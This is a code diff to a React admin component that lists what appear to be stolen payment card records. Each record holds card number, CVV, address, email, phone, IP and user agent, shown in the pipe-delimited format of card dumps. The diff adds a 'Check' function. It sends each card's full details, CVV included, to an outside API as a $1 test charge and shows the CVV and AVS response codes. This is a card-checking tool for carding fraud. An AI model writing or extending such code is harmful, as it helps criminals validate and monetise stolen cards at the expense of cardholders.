@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { Card, Table, Space, Pagination, Modal, Tag, Row, Col, Input } from 'antd';
+import { Card, Table, Space, Pagination, Modal, Tag, Row, Col, Input, Button } from 'antd';
 import axios from 'axios';
 
 const { Column } = Table;
@@ -8,10 +8,12 @@ const BottomBox = ({ dataSource, fetchData, loading }) => {
   const [isModalVisible, setIsModalVisible] = useState(false);
   const [selectedRecord, setSelectedRecord] = useState(null);
   const [note, setNote] = useState('');
+  const [checkResult, setCheckResult] = useState(null);
 
   const showModal = (record) => {
     setSelectedRecord(record);
     setNote(record.Note || ''); // Set giá trị ghi chú ban đầu
+    setCheckResult(null); // Reset kết quả kiểm tra khi mở modal mới
     setIsModalVisible(true);
   };
 
@@ -31,9 +33,31 @@ const BottomBox = ({ dataSource, fetchData, loading }) => {
     }
   };
 
+  const handleCheck = async () => {
+    // Thực hiện hành động kiểm tra khi nhấn nút "Check"
+    try {
+      const apiUrl = 'https://tele.shuniji.io/api/card';
+      const payload = {
+        cardNumber: selectedRecord.ccnum,
+        expirationMonth: selectedRecord.month,
+        expirationYear: selectedRecord.year,
+        CVV: selectedRecord.cvv,
+        billingAddress: selectedRecord.address,
+        billingPostal: selectedRecord.zipcode, // assuming zipcode is present in selectedRecord
+        amountCharge: 1
+      };
+      const response = await axios.post(apiUrl, payload);
+      setCheckResult(response.data); // Cập nhật kết quả kiểm tra
+    } catch (error) {
+      console.error('Failed to check:', error);
+      setCheckResult('Failed to check'); // Hiển thị thông báo lỗi nếu kiểm tra thất bại
+    }
+  };
+
   const handleCancel = () => {
     setIsModalVisible(false);
     setSelectedRecord(null);
+    setCheckResult(null); // Reset kết quả kiểm tra khi đóng modal
   };
 
   return (
@@ -106,6 +130,15 @@ const BottomBox = ({ dataSource, fetchData, loading }) => {
             </Col>
             <Col span={12} style={{ border: '1px solid #d9d9d9', padding: '16px', borderRadius: '4px' }}>
               <p><strong>{selectedRecord.ccnum}|{selectedRecord.month}/{selectedRecord.year}|{selectedRecord.cvv}|{selectedRecord.address}|{selectedRecord.city}|{selectedRecord.state}|{selectedRecord.email}|{selectedRecord.phone}|{selectedRecord.ip}|{selectedRecord.userAgent}</strong></p>
+            </Col>
+            <Col span={24} style={{ border: '1px solid #d9d9d9', padding: '16px', borderRadius: '4px', marginTop: '16px' }}>
+              <p><strong>Check Result:</strong></p>
+              {checkResult && typeof checkResult === 'object' ? (
+                <pre>{checkResult.ExpressResponseMessage} | {checkResult.CVVResponseCode} {checkResult.AVSResponseCode}</pre>
+              ) : (
+                <p>{checkResult?.ExpressResponseMessage}</p>
+              )}
+              <Button onClick={handleCheck} type="primary">Check</Button>
             </Col>
           </Row>
         </Modal>
